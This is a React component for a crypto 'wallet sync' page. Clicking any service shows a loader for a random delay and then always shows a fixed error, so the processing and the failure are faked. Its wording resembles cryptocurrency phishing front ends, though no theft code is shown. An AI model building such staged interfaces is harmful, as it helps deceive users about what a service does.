import React, { useState } from "react";
import { services } from "../../utils/data";
import Loader from "../Loader";
import { errorNotification, getRandomInt } from "../../utils/helpers";

const WalletSectionTwo = () => {
  const [loading, setLoading] = useState(false);
  const interval = 1000 * getRandomInt(1, 15);

  const handleCLick = () => {
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      errorNotification(
        "Your request cannot be completed at this time. Please try again"
      );
    }, interval);
  };

  return (
    <div className="h-full w-[100vw] bg-[#0A0A0B] text-white relative">
      <div className="container px-8 md:px-14 lg:px-0 pb-48 md:pb-48 ">
        <div className="mb-8 text-center">
          <h1 className="text-2xl lg:text-3xl mb-3">Things you can do</h1>
          <p className="text-sm">
            Open and decentralized protocol for syncing various Wallets to Dapps
            Secure Serve
          </p>
        </div>
        <div className="grid grid-cols-2 lg:grid-cols-4 items-center gap-5 lg:gap-10">
          {services &&
            services.map((item, i) => (
              <div
                key={i}
                onClick={handleCLick}
                className="col-span-1 p-3 lg:p-5 flex justify-between items-center rounded-full gap-3 hover:scale-110 ease-in duration-300 cursor-pointer"
                style={{ boxShadow: "4px 4px 7px #032e2a" }}
              >
                <img
                  src="/assets/images/wallet2.jpg"
                  alt=""
                  className="w-[30px] rounded-full"
                />
                <p className="text-md lg:text-lg">{item}</p>
              </div>
            ))}
        </div>
      </div>
      {loading && (
        <div className="z-50 absolute top-0 left-0 w-screen h-screen flex justify-center items-center bg-black/90 px-5 lg:px-0">
          <Loader />
        </div>
      )}
    </div>
  );
};

export default WalletSectionTwo;